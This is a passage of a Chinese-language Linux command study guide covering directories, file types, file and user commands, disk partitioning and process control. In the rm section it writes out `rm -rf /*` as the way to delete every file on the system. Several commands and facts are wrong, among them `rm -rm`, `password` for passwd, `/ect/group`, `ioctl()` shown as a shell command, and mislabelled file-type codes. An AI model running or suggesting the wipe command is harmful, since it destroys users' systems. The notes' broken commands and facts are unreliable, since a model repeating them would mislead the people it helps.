命令帮助系统</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">man [选项] [名称]</span><br><span class="line">info 命令名称</span><br><span class="line">命令名称 --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、文件和目录管理"><a href="#二、文件和目录管理" class="headerlink" title="二、文件和目录管理"></a>二、文件和目录管理</h2><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1 目录结构"></a>1 目录结构</h3><blockquote><p><a href="https://www.runoob.com/linux/linux-system-contents.html">全部目录</a></p><p><a href="https://zhuanlan.zhihu.com/p/422654168">目录作用</a></p><p><code>/proc</code>： 这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： <code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</code></p></blockquote><div class="table-container"><table><thead><tr><th>路径</th><th>作用</th></tr></thead><tbody><tr><td>/bin</td><td>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令</td></tr><tr><td>/boot</td><td>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件</td></tr><tr><td>/dev</td><td>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的</td></tr><tr><td>/etc</td><td>etc 是 Etcetera(等等) 的缩写，这个目录用来存放所有的系统管理所需要的配置文件和子目录</td></tr><tr><td>/home</td><td>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve</td></tr><tr><td>/lib</td><td>lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库</td></tr><tr><td>/lost+found</td><td>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件</td></tr><tr><td>/media</td><td>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下</td></tr><tr><td>/mnt</td><td>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容了</td></tr><tr><td>/opt</td><td>opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的</td></tr><tr><td>/proc</td><td>proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。</td></tr><tr><td>/root</td><td>该目录为系统管理员，也称作超级权限者的用户主目录</td></tr><tr><td>/sbin</td><td>s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序</td></tr><tr><td>/selinux</td><td>这个目录是 Redhat/CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的</td></tr><tr><td>/srv</td><td>该目录存放一些服务启动之后需要提取的数据</td></tr><tr><td>/sys</td><td>这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs。sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建</td></tr><tr><td>/tmp</td><td>tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的</td></tr><tr><td>/usr</td><td>usr 是 unix shared resources（共享资源）的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录</td></tr><tr><td>/usr/bin</td><td>系统用户使用的应用程序</td></tr><tr><td>/usr/sbin</td><td>超级用户使用的比较高级的管理程序和系统守护程序</td></tr><tr><td>/usr/src</td><td>内核源代码默认的放置目录</td></tr><tr><td>/var</td><td>var 是 variable（变量）的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件</td></tr><tr><td>/run</td><td>是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run</td></tr></tbody></table></div><h3 id="2-文件类型"><a href="#2-文件类型" class="headerlink" title="2 文件类型"></a>2 文件类型</h3><blockquote><p><a href="https://blog.csdn.net/tsummer2010/article/details/104438878">文件类型信息</a></p><p><a href="https://blog.csdn.net/omaidb/article/details/120090937">七种文件类型</a></p><p>查看文件类型：<code>ls -l  [ file ] || ll</code></p></blockquote><div class="table-container"><table><thead><tr><th>文件类型标识</th><th>文件类型</th></tr></thead><tbody><tr><td>-</td><td>常规文件</td></tr><tr><td>d</td><td>目录文件</td></tr><tr><td>f</td><td>文件</td></tr><tr><td>b</td><td>块设备</td></tr><tr><td>c</td><td>串行端口</td></tr><tr><td>l</td><td>链接文件</td></tr><tr><td>p</td><td>进程文件</td></tr><tr><td>s</td><td>套接字文件</td></tr></tbody></table></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例：</span></span><br><span class="line">drwxr-xr-x 2 cute cute 4096 11月 3 08:51 Desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解释</span></span><br><span class="line">d：目录文件</span><br><span class="line">rwxr-xr-x：文件的权限，属主、属组、其他人的权限（r读，w写，x执行，-无权）</span><br><span class="line">2：文件的硬连接数</span><br><span class="line">cute：属主</span><br><span class="line">cute：属组</span><br><span class="line">4096：文件的大小，对于目录而言：只是目录本身的大小，而不是里面内容的大小</span><br><span class="line">11月 3 08:51：默认是文件的修改时间</span><br><span class="line">Desktop：目录名称</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件类型信息。</span></span><br><span class="line">file [文件]</span><br></pre></td></tr></table></figure><h3 id="3-目录管理"><a href="#3-目录管理" class="headerlink" title="3 目录管理"></a>3 目录管理</h3><h4 id="3-1-一般参数"><a href="#3-1-一般参数" class="headerlink" title="3.1 一般参数"></a>3.1 一般参数</h4><div class="table-container"><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>-i</td><td>询问</td></tr><tr><td>-f</td><td>不询问</td></tr><tr><td>-v (—verbose)</td><td>提示</td></tr><tr><td>-r</td><td>递归子</td></tr><tr><td>-p</td><td>递归父</td></tr></tbody></table></div><h4 id="3-2-touch"><a href="#3-2-touch" class="headerlink" title="3.2 touch"></a>3.2 touch</h4><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-touch.html">touch</a></p><p>创建新文件或修改文件属性。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> -para &lt;file&gt;</span><br><span class="line"></span><br><span class="line">-a <span class="comment"># 修改文件的读取时间记录（access time）（当前时间）</span></span><br><span class="line">-m <span class="comment"># 修改文件的修改时间记录（modify time）（当前时间）</span></span><br><span class="line">-c <span class="comment"># 不创建新文件</span></span><br><span class="line">-d <span class="comment"># 设定时间与日期,可以使用各种不同的格式</span></span><br><span class="line">-t <span class="comment"># 设定档案的时间记录,格式与date命令相同（20011230123456）=（2001.12.30 12:34:56）</span></span><br><span class="line">-r <span class="comment"># 使用参考档的时间记录,与 --test 的效果一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件属性</span></span><br><span class="line"><span class="built_in">stat</span> &lt;file&gt;</span><br></pre></td></tr></table></figure><h4 id="3-3-cp"><a href="#3-3-cp" class="headerlink" title="3.3 cp"></a>3.3 cp</h4><blockquote><p><a href="https://m.runoob.com/linux/linux-comm-cp.html">cp</a></p><p>复制文件或目录。  </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 源可以是多个，目的只有最后一个（有多个源的话目的要是目录）</span></span><br><span class="line"><span class="built_in">cp</span> [options] sourse dest </span><br></pre></td></tr></table></figure><h4 id="3-4-ln"><a href="#3-4-ln" class="headerlink" title="3.4 ln"></a>3.4 ln</h4><blockquote><p>创建链接文件</p><p><a href="https://zhuanlan.zhihu.com/p/414331203">软链接与硬链接</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ln 参数 链接目标 链接</span></span><br><span class="line"><span class="built_in">ln</span> [options] ... [-T] TARGET LINK_NAME</span><br><span class="line"></span><br><span class="line"><span class="comment"># 硬链接：不带参数</span></span><br><span class="line"><span class="comment"># 软连接（符号连接）：-s</span></span><br></pre></td></tr></table></figure><h4 id="3-5-mv"><a href="#3-5-mv" class="headerlink" title="3.5 mv"></a>3.5 mv</h4><blockquote><p>移动文件或目录</p><p><a href="https://www.runoob.com/linux/linux-comm-mv.html">mv</a></p><p>mv可以用来改名改名。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mv [选项] [源文件|目录] [目标文件|目录]</span></span><br><span class="line"><span class="built_in">mv</span> -para src dest</span><br></pre></td></tr></table></figure><h4 id="3-6-rm"><a href="#3-6-rm" class="headerlink" title="3.6 rm"></a>3.6 rm</h4><blockquote><p>删除文件或目录</p><p><a href="https://www.runoob.com/linux/linux-comm-rm.html">rm</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#rm [选项] [文件|目录]</span></span><br><span class="line"><span class="built_in">rm</span> -para file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除Linux中所有文件</span></span><br><span class="line"><span class="built_in">rm</span> -rf /* </span><br><span class="line"><span class="comment"># 删除目录下所有文件而不删除目录</span></span><br><span class="line"><span class="built_in">rm</span> -<span class="built_in">rm</span> <span class="built_in">dir</span>/*</span><br></pre></td></tr></table></figure><h3 id="4-目录操作"><a href="#4-目录操作" class="headerlink" title="4 目录操作"></a>4 目录操作</h3><h4 id="4-1-pwd"><a href="#4-1-pwd" class="headerlink" title="4.1 pwd"></a>4.1 pwd</h4><blockquote><p>（print working directory）显示当前工作目录路径  。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><h4 id="4-2-cd"><a href="#4-2-cd" class="headerlink" title="4.2 cd"></a>4.2 cd</h4><blockquote><p>改变工作目录</p><ul><li><code>.</code>：当前目录。</li><li><code>..</code>：当前目录的父目录。</li><li><code>~</code> ：当前用户的主目录。 </li></ul></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd [目录]</span></span><br><span class="line"><span class="built_in">cd</span> path</span><br></pre></td></tr></table></figure><h4 id="4-3-ls"><a href="#4-3-ls" class="headerlink" title="4.3 ls"></a>4.3 ls</h4><blockquote><p> 列出目录下的档案或目录</p><p><a href="https://www.runoob.com/linux/linux-comm-ls.html">ls</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls [选项] [目录|文件]</span></span><br><span class="line"><span class="built_in">ls</span> -para file</span><br></pre></td></tr></table></figure><h4 id="4-4-mkdir"><a href="#4-4-mkdir" class="headerlink" title="4.4 mkdir"></a>4.4 mkdir</h4><blockquote><p>创建指定名称的目录 </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mkdir [选项] 目录...</span></span><br><span class="line"><span class="built_in">mkdir</span> -para file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定权限(类似 chmod，而不是 rwxrwxrwx 减 umask)</span></span><br><span class="line">-m (--mode) &lt;mode&gt; </span><br><span class="line"><span class="comment"># 创建多个目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -v zp&#123;1..10&#125;</span><br></pre></td></tr></table></figure><h4 id="4-5-rmdir"><a href="#4-5-rmdir" class="headerlink" title="4.5 rmdir"></a>4.5 rmdir</h4><blockquote><p>删除目录 </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rmdir [选项] [目录名]</span></span><br><span class="line"><span class="built_in">rmdir</span> -para file</span><br></pre></td></tr></table></figure><hr><h2 id="三、用户与用户组"><a href="#三、用户与用户组" class="headerlink" title="三、用户与用户组"></a>三、用户与用户组</h2><h3 id="1-用户账户"><a href="#1-用户账户" class="headerlink" title="1 用户账户"></a>1 用户账户</h3><blockquote><p>用户账户UID定义</p><ul><li>超级用户root：UID = 0</li><li>系统用户：1 &lt; UID &lt; 999</li><li>普通用户：UID &gt; 1000</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户账户文件</span></span><br><span class="line"><span class="comment"># 一般账户信息</span></span><br><span class="line">/etc/passwd</span><br><span class="line">username:password:uid:gid:userinfo:home:shell</span><br><span class="line"><span class="comment"># 用户名：密码（x表示映射到了shadow里）：用户ID：组ID：用户注释：主目录：默认shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户密码信息</span></span><br><span class="line">/etc/shadow</span><br><span class="line">username:password:lastchg:min:max:warn:inactive:expire:flag</span><br><span class="line"><span class="comment"># 用户名：密码（!未设置密码）：最后改密码的日期：改口令间隔：有效最大天数：换密码前几天警告：几天后禁止登入：被禁时间：保留</span></span><br></pre></td></tr></table></figure><h3 id="2-用户命令"><a href="#2-用户命令" class="headerlink" title="2 用户命令"></a>2 用户命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># useradd | adduser (Ubuntu) 添加用户</span></span><br><span class="line"><span class="comment"># useradd [选项] [用户名]</span></span><br><span class="line">useradd -para username</span><br><span class="line">-d <span class="comment"># 指定主目录，不存在-m可以创建主目录</span></span><br><span class="line">-g <span class="comment"># 指定用户组</span></span><br><span class="line">-r <span class="comment"># 建立系统账号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adduser (Ubuntu)</span></span><br><span class="line">adduser <span class="comment"># 创建普通用户</span></span><br><span class="line">adduser --system <span class="comment"># 创建系统用户</span></span><br><span class="line">adduser --group <span class="comment"># 创建用户组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># password | usermod | chage （改密码，改类型，改时效）</span></span><br><span class="line"><span class="comment"># password [选项] [用户名] 无参则表示设置密码</span></span><br><span class="line">password -para username </span><br><span class="line">-d <span class="comment"># 删除密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># usermod [选项] [用户名]</span></span><br><span class="line">usermod -para username</span><br><span class="line">-d <span class="comment"># 设置登入目录</span></span><br><span class="line">-u <span class="comment"># 修改UID</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chage [选项] [用户名]（不输入参数直接进入交互模式）</span></span><br><span class="line">chage -para username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># userdel | deluser (Ubuntu) 删除用户</span></span><br><span class="line"><span class="comment"># userdel [选项] [用户名]</span></span><br><span class="line">userdel -para username</span><br><span class="line">-r 删除主目录和其中所有文件</span><br><span class="line">-f 强制删除用户</span><br><span class="line"></span><br><span class="line"><span class="comment"># deluser (Ubuntu)</span></span><br><span class="line">deluser</span><br><span class="line">deluser --system </span><br><span class="line">deluser --group</span><br></pre></td></tr></table></figure><h3 id="3-用户组账户"><a href="#3-用户组账户" class="headerlink" title="3 用户组账户"></a>3 用户组账户</h3><blockquote><p>用户组账户GID定义同理用户UID定义</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户组账户文件</span></span><br><span class="line"><span class="comment"># 组用户信息</span></span><br><span class="line">/ect/group</span><br><span class="line">group_name:group_password:group_id:group_members</span><br><span class="line"><span class="comment"># 组用户名：组用户密码（x表示映射到了shadow里）：用户组ID：成员清单（逗号隔开）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组密码信息</span></span><br><span class="line">/ect/gshadow</span><br><span class="line">group_name:group_password:group_id:group_members</span><br><span class="line"><span class="comment"># 组用户名：组用户密码（!未设置密码）：用户组ID：成员清单（逗号隔开）</span></span><br></pre></td></tr></table></figure><h3 id="4-用户组命令"><a href="#4-用户组命令" class="headerlink" title="4 用户组命令"></a>4 用户组命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># groupadd | addgroup(Ubuntu) 添加组</span></span><br><span class="line"><span class="comment"># group [选项] [组名]</span></span><br><span class="line">group -para group</span><br><span class="line">-f <span class="comment"># 组存在该选项失效并以成功状态退出，如果GID被使用，则取消-g</span></span><br><span class="line">-g <span class="comment"># 指定GID，GID唯一非负，默认大于等于GID_MIN，并大于每个其他组的GID</span></span><br><span class="line">-K <span class="comment"># 不使用/etc/login.defs 中的默认值（如GID_MIN、GID_MAX）</span></span><br><span class="line">-o <span class="comment"># 允许创建有重复GID的组</span></span><br><span class="line">-r <span class="comment"># 创建系统组账户，GID小于1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># addgroup(Ubuntu)</span></span><br><span class="line">addgroup [ --gid ID ] GROUP <span class="comment"># 普通组</span></span><br><span class="line">addgroup --system [ --gid ID ] GROUP <span class="comment"># 系统组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># groupmod 修改组属性</span></span><br><span class="line"><span class="comment"># groupmod [选项] [组账户名]</span></span><br><span class="line">groupmod -para group</span><br><span class="line">-g <span class="comment"># 修改用户组的GID</span></span><br><span class="line">-n <span class="comment"># 修改用户组名</span></span><br><span class="line">-o <span class="comment"># 允许使用重复的GID</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># groupdel | delgroup (Ubuntu)删除组</span></span><br><span class="line"><span class="comment"># groupdel [ 组名 ]</span></span><br><span class="line">groupdel group</span><br><span class="line"></span><br><span class="line"><span class="comment"># delgroup [ 组名 ]</span></span><br><span class="line">delgroup group</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gpasswd 管理组账户</span></span><br><span class="line">gpasswd</span><br><span class="line">-a <span class="comment"># 添加到用户组</span></span><br><span class="line">-d <span class="comment"># 删除用户组中的某一用户</span></span><br><span class="line">-A <span class="comment"># 指定管理员</span></span><br><span class="line">-M <span class="comment"># 指定组成员</span></span><br><span class="line">-r <span class="comment"># 删除密码</span></span><br><span class="line">-R <span class="comment"># 限制用户登入组，只有组中的成员才能用 newgrp 命令加入该组</span></span><br></pre></td></tr></table></figure><hr><h2 id="四、磁盘分区"><a href="#四、磁盘分区" class="headerlink" title="四、磁盘分区"></a>四、磁盘分区</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>磁盘分区：</p><ul><li>将一个磁盘驱动器分成若干个逻辑驱动器</li><li>磁盘的分区信息保存在分区表中。分区表是一个磁盘分区的索引</li><li>MBR ( master boot record ) 主分区引导记录</li><li>GPT ( globally unique identifier partition table ) GUID分区表</li><li>GPT相对于MBR突出的优势是GPT可管理空间大、支持的分区数量多</li></ul><p>格式化：格式化会情况现有分区的所有数据并创造一些系统文件</p><p>命名方式：sda sdb sdc … （依照设备ID）</p></blockquote><h3 id="2-查看设备列表"><a href="#2-查看设备列表" class="headerlink" title="2 查看设备列表"></a>2 查看设备列表</h3><blockquote><p><code>ls /dev/sd*</code></p></blockquote><h3 id="3-fdisk"><a href="#3-fdisk" class="headerlink" title="3 fdisk"></a>3 fdisk</h3><blockquote><p>磁盘分区（分区 &gt; 2 TB使用parted命令）</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fdisk 命令参数带-，否则进入交互界面（交互界面用命令不带 -）</span></span><br><span class="line">fdisk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用交互界面命令</span></span><br><span class="line">F <span class="comment"># 列出空闲区</span></span><br><span class="line">n <span class="comment"># 创建新分区（p主分区，e扩展分区）（创建的最后扇区可以直接 +1G 进行分区）</span></span><br><span class="line">p <span class="comment"># 查看分区</span></span><br><span class="line">d <span class="comment"># 删除分区</span></span><br><span class="line">w/q <span class="comment"># 保存退出，不保存退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新读取分区表</span></span><br><span class="line">ioctl()</span><br></pre></td></tr></table></figure><h3 id="4-mkfs"><a href="#4-mkfs" class="headerlink" title="4 mkfs"></a>4 mkfs</h3><blockquote><p>创建文件系统</p><p><a href="https://www.runoob.com/linux/linux-comm-mkfs.html">mkfs</a></p><p>创建了文件系统才可以挂载</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mkfs [选项][-t &lt;类型&gt;][文件系统选项]&lt;设备&gt;[&lt;大小&gt;]</span></span><br><span class="line">mkfs</span><br><span class="line"></span><br><span class="line">-V <span class="comment"># 详细显示模式</span></span><br><span class="line">-c <span class="comment"># 在建立文件系统前检查partition（分组）是否有坏道</span></span><br><span class="line">-t <span class="comment"># 指定文件系统的类型，不指定预设值为ext2</span></span><br><span class="line">&lt;大小&gt; <span class="comment"># 要使用设备上的快数</span></span><br><span class="line">&lt;设备&gt; <span class="comment"># 要使用设备的路径</span></span><br><span class="line">-v <span class="comment"># 显示版本信息</span></span><br></pre></td></tr></table></figure><h3 id="5-mount-umount"><a href="#5-mount-umount" class="headerlink" title="5 mount/umount"></a>5 mount/umount</h3><blockquote><p>磁盘分区挂载与卸载</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mount [-t文件系统类型][-L 卷标][-o 挂载选项]设备名 挂载点</span></span><br><span class="line">-t <span class="comment"># 不指定选自动选择</span></span><br><span class="line">-o <span class="comment"># 挂载选项</span></span><br><span class="line">loop <span class="comment"># 把一个文件当成磁盘分区挂载到系统上</span></span><br><span class="line">ro <span class="comment"># 采用只读挂载</span></span><br><span class="line">rw <span class="comment"># 采用读写挂载</span></span><br><span class="line">iocharset <span class="comment"># 指定访问文件系统所用的字符集</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># umount [选项] &lt;源&gt;|&lt;目录&gt;</span></span><br><span class="line">-a <span class="comment"># 卸载/etc/mtab中记录的所有文件系统</span></span><br><span class="line">-n <span class="comment"># 卸载时不将信息存入/etc/mtab中</span></span><br><span class="line">-r <span class="comment"># 无法成功卸载则尝试以只读方式重新挂入文件系统</span></span><br><span class="line">-t <span class="comment"># &lt;文件系统类型&gt; 仅卸载选项中所指定的文件系统</span></span><br><span class="line">-v <span class="comment"># 详细信息</span></span><br></pre></td></tr></table></figure><h3 id="6-fsck"><a href="#6-fsck" class="headerlink" title="6 fsck"></a>6 fsck</h3><blockquote><p>文件系统的检查和修复</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fsck [选项][设备名]</span></span><br><span class="line">-p <span class="comment"># 不提示直接修复</span></span><br><span class="line">-c <span class="comment"># 检查可能的坏块并加入坏块列表</span></span><br><span class="line">-f <span class="comment"># 强制进行检查（即使被标记为“没有问题”）</span></span><br><span class="line">-n <span class="comment"># 只检查不修复</span></span><br><span class="line">-v <span class="comment"># 显示更多信息</span></span><br><span class="line">-y <span class="comment"># yes yes yes</span></span><br></pre></td></tr></table></figure><h3 id="7-df"><a href="#7-df" class="headerlink" title="7 df"></a>7 df</h3><blockquote><p> 查看磁盘使用情况</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># df [选项][文件名]</span></span><br><span class="line">-h <span class="comment"># 易读显示 1KB = 1024B</span></span><br></pre></td></tr></table></figure><h3 id="8-du"><a href="#8-du" class="headerlink" title="8 du"></a>8 du</h3><blockquote><p>查看文件和目录磁盘使用情况</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># du [选项][文件]</span></span><br><span class="line">-h <span class="comment"># 易读</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、进程管理"><a href="#五、进程管理" class="headerlink" title="五、进程管理"></a>五、进程管理</h2><h3 id="1-查看"><a href="#1-查看" class="headerlink" title="1 查看"></a>1 查看</h3><h4 id="1-1-ps"><a href="#1-1-ps" class="headerlink" title="1.1 ps"></a>1.1 ps</h4><blockquote><p>静态监控</p><p><a href="https://www.runoob.com/linux/linux-comm-ps.html">ps</a></p></blockquote><h4 id="1-2-pstree"><a href="#1-2-pstree" class="headerlink" title="1.2 pstree"></a>1.2 pstree</h4><blockquote><p>查看进程树</p><p><a href="https://www.runoob.com/linux/linux-comm-pstree.html">pstree</a></p></blockquote><h4 id="1-3-top"><a href="#1-3-top" class="headerlink" title="1.3 top"></a>1.3 top</h4><blockquote><p>动态监控</p><p><a href="https://www.runoob.com/linux/linux-comm-top.html">top</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-p pid <span class="comment"># 指定pid</span></span><br></pre></td></tr></table></figure><h4 id="1-4-lsof"><a href="#1-4-lsof" class="headerlink" title="1.4 lsof"></a>1.4 lsof</h4><blockquote><p> 列出进程打开的文件的信息，端口号，网络活动。</p><p><a href="https://www.runoob.com/w3cnote/linux-check-port-usage.html">lsof</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-i:port <span class="comment"># 端口活动</span></span><br></pre></td></tr></table></figure><h4 id="1-5-pidof"><a href="#1-5-pidof" class="headerlink" title="1.5 pidof"></a>1.5 pidof</h4><blockquote><p>查看进程pid </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pidof [选项][进程名]</span></span><br><span class="line">-s <span class="comment"># 表示只返回1个pid</span></span><br><span class="line">-x <span class="comment"># 表示同时返回运行给定程序的shell的pid</span></span><br><span class="line">-o <span class="comment"># 表示告诉 piod 表示忽略后面给定的pid可以使用多个-o</span></span><br></pre></td></tr></table></figure><h3 id="2-控制"><a href="#2-控制" class="headerlink" title="2 控制"></a>2 控制</h3><h4 id="2-1-nice"><a href="#2-1-nice" class="headerlink" title="2.1 nice"></a>2.1 nice</h4><blockquote><p>调整即将运行的进程优先级</p><p>NI：nice值越高表示高友善度，低优先级。（不能完全决定进程优先级）</p><p>PRI：PRI( new ) = PRI ( old ) + NI ，同理NI。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nice [命令][进程名]</span></span><br><span class="line">-n &lt;num&gt; <span class="comment"># 设置nice值（ 默认N=10 ）</span></span><br></pre></td></tr></table></figure><h4 id="2-2-renice"><a href="#2-2-renice" class="headerlink" title="2.2 renice"></a>2.2 renice</h4><blockquote><p>调整运行的进程的优先级</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># renice [-n] &lt;优先级&gt; [ -p/-g/-u ] &lt;pid/gpid/user&gt;</span></span><br><span class="line">-n  <span class="comment"># 指定nice增量</span></span><br></pre></td></tr></table></figure><h4 id="2-3-kill"><a href="#2-3-kill" class="headerlink" title="2.3 kill"></a>2.3 kill</h4><blockquote><p>发送指定信号给进程</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kill [ -s 信号声明|-n 信号编号|-信号声明]进程号|任务声明 ...</span></span><br><span class="line">-l <span class="comment"># 列出所有信号</span></span><br></pre></td></tr></table></figure><h4 id="2-4-killall"><a href="#2-4-killall" class="headerlink" title="2.4 killall"></a>2.4 killall</h4><blockquote><p>杀死指定名字的进程</p><p><a href="https://www.runoob.com/linux/linux-comm-killall.html">killall</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># killall [选项][进程号]</span></span><br><span class="line">-e <span class="comment"># 精确匹配名称</span></span><br></pre></td></tr></table></figure><h3 id="3-生命"><a href="#3-生命" class="headerlink" title="3 生命"></a>3 生命</h3><h4 id="3-1-启动"><a href="#3-1-启动" class="headerlink" title="3.1 启动"></a>3.1 启动</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi <span class="comment"># 前台启动</span></span><br><span class="line">vi &amp; <span class="comment"># 后台启动</span></span><br></pre></td></tr></table></figure><h4 id="3-2-挂起"><a href="#3-2-挂起" class="headerlink" title="3.2 挂起"></a>3.2 挂起</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctrl + z <span class="comment"># 挂起</span></span><br></pre></td></tr></table></figure><h4 id="3-3-jobs"><a href="#3-3-jobs" class="headerlink" title="3.3 jobs"></a>3.3 jobs</h4><blockquote><p>显示任务状态</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># jobs [选项][任务声明 ...]</span></span><br><span class="line">-l <span class="comment"># 在正常信息的基础上列出进程号</span></span><br><span class="line">-n <span class="comment"># 仅列出上次通告之后改变了状态的进程</span></span><br><span class="line">-p <span class="comment"># 仅列出进程号</span></span><br><span class="line">-r <span class="comment"># 限制仅输出运行中的任务</span></span><br><span class="line">-s <span class="comment"># 限制仅输出停止的任务</span></span><br></pre></td></tr></table></figure><h4 id="3-4-fg-将任务移至前台"><a href="#3-4-fg-将任务移至前台" class="headerlink" title="3.4 fg    将任务移至前台"></a>3.4 fg    将任务移至前台</h4><blockquote><p><code>fg [ %N ]</code> 将任务N移至前台。</p><p>N是通过<code>jobs</code>命令查到的后台任务编号。（不是pid）。</p><p>不指定则Shell程序中的“当前任务”将会被使用。</p></blockquote><h4 id="3-5-bg-将任务移至后台"><a href="#3-5-bg-将任务移至后台" class="headerlink" title="3.5 bg   将任务移至后台"></a>3.5 bg   将任务移至后台</h4><blockquote><p><code>bg [ %N ]</code> 将任务N移至后台。</p><p>N是通过<code>jobs</code>命令查到的后台任务编号。（不是pid）</p><p>不指定则Shell程序中的“当前任务”将会被使用。</p></blockquote><h4 id="3-6-nohup"><a href="#3-6-nohup" 